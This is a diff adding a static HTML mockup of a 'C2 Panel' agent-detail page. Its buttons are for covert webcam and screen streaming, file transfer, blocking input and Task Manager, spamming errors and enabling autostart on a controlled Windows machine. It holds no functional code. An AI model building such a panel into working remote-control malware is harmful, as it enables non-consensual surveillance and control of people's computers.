@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Agent Detail - C2 Panel</title>
+    <link rel="stylesheet" href="index.css">
+    <link rel="stylesheet" href="techno-noir.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
+    <style>
+        .btn-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(230px, 1fr));
+            gap: 10px;
+            margin-bottom: 8px;
+        }
+        .result-box {
+            background: var(--bg-elevated);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 18px 20px;
+            font-family: var(--font-mono);
+            font-size: 12.5px;
+            line-height: 1.65;
+            color: var(--text-secondary);
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        .category-block { margin-top: 8px; }
+    </style>
+</head>
+<body>
+    <div class="dashboard-shell">
+        <div class="dashboard-noise"></div>
+        <div class="dashboard-orbit dashboard-orbit-left"></div>
+        <div class="dashboard-orbit dashboard-orbit-right"></div>
+
+        <div class="dashboard-page">
+            <!-- Header -->
+            <div class="dashboard-panel dashboard-header reveal reveal-1">
+                <div>
+                    <button class="btn-text" onclick="window.location.href='agent-list.html'" style="margin-bottom: 12px;">
+                        <span class="material-icons">arrow_back</span>
+                        Back to agents
+                    </button>
+                    <p class="eyebrow">agent control / node #001</p>
+                    <div class="dashboard-title-row">
+                        <div class="dashboard-logo">
+                            <span class="material-icons">sensors</span>
+                        </div>
+                        <div>
+                            <h3 class="dashboard-title">DESKTOP-ABC123</h3>
+                            <p class="dashboard-subtitle">192.168.1.100 · Windows 11 Pro · john_doe</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="dashboard-header-meta">
+                    <div class="status-badge is-online">
+                        <span class="status-badge-dot"></span>
+                        online
+                    </div>
+                    <p class="dashboard-timestamp">Last seen 2m ago</p>
+                </div>
+            </div>
+
+            <!-- Monitoring -->
+            <div class="reveal reveal-3 category-block">
+                <div class="section-head"><p class="category-title">Monitoring</p></div>
+                <div class="btn-grid">
+                    <button class="action-btn primary"><span class="material-icons">screenshot</span>Screenshot</button>
+                    <button class="action-btn primary"><span class="material-icons">videocam</span>Screen Stream</button>
+                    <button class="action-btn primary"><span class="material-icons">camera_alt</span>Webcam Stream</button>
+                </div>
+            </div>
+
+            <!-- File Management -->
+            <div class="reveal reveal-3 category-block">
+                <div class="section-head"><p class="category-title">File Management</p></div>
+                <div class="btn-grid">
+                    <button class="action-btn primary"><span class="material-icons">download</span>Download File</button>
+                    <button class="action-btn primary"><span class="material-icons">upload</span>Upload File</button>
+                    <button class="action-btn primary"><span class="material-icons">folder_open</span>Open File</button>
+                </div>
+            </div>
+
+            <!-- Display & UI -->
+            <div class="reveal reveal-3 category-block">
+                <div class="section-head"><p class="category-title">Display & UI</p></div>
+                <div class="btn-grid">
+                    <button class="action-btn primary"><span class="material-icons">tab</span>Open Browser Tabs</button>
+                    <button class="action-btn primary"><span class="material-icons">wallpaper</span>Change Wallpaper</button>
+                    <button class="action-btn primary"><span class="material-icons">image</span>Fullscreen Image</button>
+                    <button class="action-btn warning"><span class="material-icons">screen_rotation</span>Rotate Display</button>
+                </div>
+            </div>
+
+            <!-- System Control -->
+            <div class="reveal reveal-3 category-block">
+                <div class="section-head"><p class="category-title">System Control</p></div>
+                <div class="btn-grid">
+                    <button class="action-btn warning"><span class="material-icons">block</span>Block Input</button>
+                    <button class="action-btn warning"><span class="material-icons">volume_off</span>Mute Audio</button>
+                    <button class="action-btn warning"><span class="material-icons">visibility</span>Hide Taskbar</button>
+                    <button class="action-btn warning"><span class="material-icons">block</span>Block Task Manager</button>
+                    <button class="action-btn warning"><span class="material-icons">cancel</span>Block Application</button>
+                    <button class="action-btn warning"><span class="material-icons">error</span>Spam Errors</button>
+                </div>
+            </div>
+
+            <!-- Autostart -->
+            <div class="reveal reveal-3 category-block">
+                <div class="section-head"><p class="category-title">Autostart</p></div>
+                <div class="btn-grid">
+                    <button class="action-btn primary"><span class="material-icons">check_circle</span>Check Autostart</button>
+                    <button class="action-btn primary"><span class="material-icons">play_arrow</span>Enable Autostart</button>
+                    <button class="action-btn warning"><span class="material-icons">stop</span>Disable Autostart</button>
+                </div>
+            </div>
+
+            <!-- Critical -->
+            <div class="reveal reveal-3 category-block">
+                <div class="section-head"><p class="category-title">Critical Actions</p></div>
+                <div class="btn-grid">
+                    <button class="action-btn danger"><span class="material-icons">lock</span>Lock Screen</button>
+                    <button class="action-btn danger"><span class="material-icons">power_settings_new</span>Shutdown</button>
+                    <button class="action-btn danger"><span class="material-icons">delete</span>Uninstall Agent</button>
+                </div>
+            </div>
+
+            <!-- Command Output -->
+            <div class="section-head reveal reveal-4">
+                <p class="section-title">Command Output</p>
+                <p class="section-note">latest response from the agent</p>
+            </div>
+            <div class="dashboard-panel reveal reveal-5">
+                <div class="result-box">Command executed successfully.
+
+Screenshot captured: 1920x1080
+File size: 245 KB</div>
+            </div>
+
+            <!-- Screenshot -->
+            <div class="section-head reveal reveal-6">
+                <p class="section-title">Screenshot</p>
+                <button class="btn-outlined">
+                    <span class="material-icons">download</span>
+                    Download
+                </button>
+            </div>
+            <div class="dashboard-panel reveal reveal-7" style="padding: 14px;">
+                <img src="https://via.placeholder.com/1920x1080/15181c/8a929d?text=Screenshot+Preview"
+                     alt="Screenshot"
+                     style="width: 100%; height: auto; border-radius: 10px; border: 1px solid var(--border); display: block;">
+            </div>
+        </div>
+    </div>
+</body>
+</html>
